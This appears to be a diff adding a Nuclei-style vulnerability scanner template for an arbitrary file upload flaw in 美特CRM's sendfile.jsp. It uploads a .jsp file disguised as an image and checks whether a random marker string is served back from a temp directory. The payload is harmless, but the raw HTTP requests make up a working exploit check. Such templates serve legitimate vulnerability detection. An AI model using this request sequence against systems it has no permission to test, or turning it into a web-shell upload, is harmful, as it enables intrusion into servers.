@@ -1,0 +1,61 @@
+id: meiteCRM-sendfile-upload
+
+info:
+  name: 美特CRM sendfile.jsp 存在任意文件上传漏洞
+  author: meiteCRM
+  severity: high
+  tags: meiteCRM
+
+http:
+  - raw:
+      - |
+        POST /business/common/importdata/sendfile.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypZBE5JAfBHwD8TNo
+        Accept: */*
+        Connection: close
+
+        ------WebKitFormBoundarypZBE5JAfBHwD8TNo
+        Content-Disposition: form-data; name="file"; filename="upload.jsp"
+        Content-Type: image/jpeg
+        
+        {{randstr_1}}
+        ------WebKitFormBoundarypZBE5JAfBHwD8TNo--
+
+      - |+
+        GET /userfile/default/temp/{{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+      - |+
+        GET /userfile/temp/{{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - 'temp\\(.*?\.jsp)'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{randstr_1}}'
+      - type: dsl
+        dsl:
+          - 'len(body) < 40'
+    matchers-condition: and
